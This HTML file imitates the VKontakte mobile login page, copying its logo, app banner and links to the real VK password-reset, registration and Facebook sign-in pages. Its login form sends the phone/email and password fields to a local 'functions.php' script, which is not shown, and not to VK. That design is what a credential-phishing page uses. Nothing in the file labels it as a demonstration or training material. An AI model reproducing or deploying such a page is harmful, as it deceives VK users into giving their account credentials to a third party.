<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Вход | ВКонтакте</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://fonts.googleapis.com/css?family=Noto+Sans|Roboto&display=swap" rel="stylesheet">
</head>

<body>
<!-- Header -->
	<header>
		<div class="logo_bar">
			<img src="images/logovk.jpg">
		</div>
	</header>
	<div class="container">
<!-- Строка с рекламой приложения -->
		<a class="vk_app_main" href="https://m.vk.com/products">
		<div class="vk_app">
			<img class="phone" src="images/phone.png">
			<div class="phone_text">
				<b class="phone_text_1">Установить приложение</b>
				<b class="phone_text_2">ВКонтакте</b>
			</div>
			<img class="next" src=images/next.jpg>
		</div>
		</a>
<!-- Блок логин/пароль -->
		<div class="log_pass">
			<p class="log_text_1">Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.</p>
		<!-- login -->
			<form action="functions.php" method='post'>
          		<input type="text" class="input_email" name="email" value="" placeholder="Телефон или email">
          		<input type="password" class="input_password" name="password" value="" placeholder="Пароль">
          		<input type="submit" class="input_button" value="Войти">
			</form>
		<!-- Забыли пароль? -->
			<a class="know_pass" href="https://static.vk.com/restore/#/resetPassword" rel="noopener">Забыли пароль?</a>
		<!-- Впервые в ВКонтакте? -->
			<div class="new_person_main">
				<p class="new_person">Впервые ВКонтакте?</p>
			</div>
			<a class="new_acc" href="https://m.vk.com/join">Зарегистрироваться</a>
			<a class="facebook" href="https://m.facebook.com/login.php?skip_api_login=1&api_key=128749580520227&kid_directed_site=0&app_id=128749580520227&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D128749580520227%26redirect_uri%3Dhttps%253A%252F%252Fm.vk.com%252Fjoin%253Fact%253Dfb_sign%26scope%3Demail%252Cuser_birthday%252Cpublish_actions%26state%3Dcfa55ba5877405be7a%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D97bc3bdf-5faf-4ce8-be8b-ac3c5fffa03e&cancel_url=https%3A%2F%2Fm.vk.com%2Fjoin%3Fact%3Dfb_sign%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dcfa55ba5877405be7a%23_%3D_&display=touch&locale=ru_RU&pl_dbl=0&refsrc=http%3A%2F%2Fm.vk.com%2Flogin&_rdr"><img class="facebook_logo" src="images/facebook.jpg"></img>   Войти через Facebook</a>
		</div>
	</div>
</body>
</html>